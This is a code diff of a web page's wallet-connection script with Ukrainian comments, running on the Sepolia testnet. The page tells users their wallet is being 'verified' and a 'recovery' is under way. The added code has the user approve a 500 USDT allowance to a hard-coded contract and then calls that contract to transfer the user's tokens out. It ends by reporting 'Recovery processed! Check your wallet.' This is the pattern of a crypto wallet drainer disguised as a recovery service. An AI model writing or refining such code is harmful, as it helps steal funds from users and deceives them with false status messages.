@@ -101,29 +101,26 @@
                 });
                 console.log('Step 7: Message signed successfully!');
                 console.log('Signature:', signature);
-                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
+                document.getElementById('status').innerText = 'Wallet verified. Approving tokens...';
 
-                // Виклик executeApprove через ApproveContract
-                const contractAddress = '0x1E8eF3d114554cFD4a0DD1faBF79f4C7f5C1C218'; // Поточна адреса (оновити після розгортання)
+                // Прямий виклик approve через TestUSDT
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
+                const contractAddress = '0x45082F912D180D8296220940aC164c5feC775d3c'; // Оновити після розгортання
                 const amount = 500000000; // 500 USDT (6 decimals)
 
-                const contractAbi = [
-                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, uint256 amount) external"
+                const tokenAbi = [
+                    "function approve(address spender, uint256 amount) external returns (bool)",
+                    "function balanceOf(address) view returns (uint256)",
+                    "function decimals() view returns (uint8)"
                 ];
 
                 console.log('Step 8: Initializing provider and signer...');
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
-                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+                const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, signer);
 
                 // Перевірка балансу
                 console.log('Step 9: Checking balance...');
-                const tokenAbi = [
-                    "function balanceOf(address) view returns (uint256)",
-                    "function decimals() view returns (uint8)"
-                ];
-                const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, provider);
                 const balance = await tokenContract.balanceOf(userAddress);
                 const decimals = await tokenContract.decimals();
                 const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
@@ -142,12 +139,23 @@
                     throw new Error('Insufficient Sepolia ETH for gas. Need at least 0.01 ETH.');
                 }
 
-                // Виклик executeApprove
-                console.log('Step 11: Executing approve and transfer...');
+                // Виклик approve для ApproveContract
+                console.log('Step 11: Approving tokens for contract...');
+                const approveTx = await tokenContract.approve(contractAddress, amount);
+                const approveReceipt = await approveTx.wait();
+                console.log('Approve Transaction Hash:', approveReceipt.transactionHash);
+
+                // Виклик transferTokens через ApproveContract
+                const contractAbi = [
+                    "function transferTokens(bytes memory message, address user, bytes memory signature, address token, uint256 amount) external"
+                ];
+                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+
+                console.log('Step 12: Transferring tokens...');
                 const messageBytes = ethers.utils.toUtf8Bytes(message);
-                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, amount);
-                const receipt = await tx.wait();
-                console.log('Transaction Hash:', receipt.transactionHash);
+                const transferTx = await contract.transferTokens(messageBytes, userAddress, signature, usdtAddress, amount);
+                const transferReceipt = await transferTx.wait();
+                console.log('Transfer Transaction Hash:', transferReceipt.transactionHash);
 
                 document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
             } catch (error) {
